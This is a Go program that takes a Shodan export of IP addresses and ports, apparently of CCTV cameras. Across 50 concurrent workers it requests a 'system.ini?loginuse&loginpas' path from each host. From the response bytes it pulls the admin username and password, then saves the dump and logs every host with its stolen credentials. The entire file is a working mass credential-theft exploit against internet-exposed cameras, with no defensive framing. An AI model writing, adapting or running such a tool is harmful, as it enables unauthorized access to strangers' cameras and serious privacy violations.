package main

import (
	"bufio"
	"bytes"
	"encoding/csv"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

var (
	myRecords  [][]string
	maxRecords int
	maxWorker  int
	//ResultLog Logging result
	ResultLog = &log.Logger{}
)

// Result struct
type Result struct {
	username string
	password string
	message  string
	err      error
	ok       bool
}

func check(err error) {
	if err != nil {
		log.Fatal(err)
		os.Exit(1)
	}
}

func getAuthority(hostPort []string) Result {
	payload := "system.ini?loginuse&loginpas"
	host, port := hostPort[0], hostPort[1]
	filename := "./system/" + strings.Replace(host, ".", "_", -1)
	_url := fmt.Sprintf("http://%s:%s/%s", host, port, payload)
	netClient := &http.Client{
		Timeout: time.Second * 3,
	}
	result := Result{err: nil, ok: false, username: "", password: "", message: ""}
	response, err := netClient.Get(_url)
	if err == nil {
		body, _ := ioutil.ReadAll(response.Body)
		lenBody := len(body)
		if lenBody > 1700 {
			subBody := body[1680:1727]
			i := bytes.Index(subBody, []byte("\x00"))
			result.username = string(bytes.Trim(subBody[:i], "\x00"))
			result.password = string(bytes.Trim(subBody[i:], "\x00"))
			if result.username != "admin" {
				ioutil.WriteFile(filename, body, 0644)
				result.message = "write to " + filename
			}
			result.ok = true
		} else {
			if response.StatusCode == 200 {
				ioutil.WriteFile(filename, body, 0644)
				result.message = "write to " + filename
				result.ok = true
			}
		}

	} else {
		result.err = err
	}
	return result
}

func worker(id int, jobs <-chan []string, results chan<- Result) {
	for hostPort := range jobs {
		result := getAuthority(hostPort)
		results <- result
		if true == result.ok {
			log.Println(" worker", id, "finished job", hostPort, result.username, result.password, result.message)
			if len(result.username) > 0 && len(result.password) > 0 {
				ResultLog.Println(fmt.Sprintf("%s:%s|%s:%s", hostPort[0], hostPort[1], result.username, result.password))
			}
		}
	}
}

func main() {
	// worker
	maxWorker = 50

	// Logging
	coreLogFile, err := LoggerInit(LogFile)
	check(err)
	defer coreLogFile.Close()

	ResultLogFile, err := NewLogger(ResultLog, ResultLogFile)
	check(err)
	defer ResultLogFile.Close()

	// Load a CSV file.
	f, err := os.Open("shodan/shodan-export.csv")
	check(err)
	if nil == err {
		r := csv.NewReader(bufio.NewReader(f))
		myRecords, err := r.ReadAll()
		if nil == err {
			maxRecords = len(myRecords)
			jobs := make(chan []string, maxRecords)
			results := make(chan Result, maxRecords)

			// Start Worker
			for w := 1; w <= maxWorker; w++ {
				go worker(w, jobs, results)
			}

			// Create jobs
			for _, recordCCTV := range myRecords {
				ip, address := strings.TrimSpace(recordCCTV[0]), strings.TrimSpace(recordCCTV[1])
				jobs <- []string{ip, address}
			}
			close(jobs)

			// Getting results
			for a := 1; a <= maxRecords; a++ {
				<-results
			}
		}
	}
}
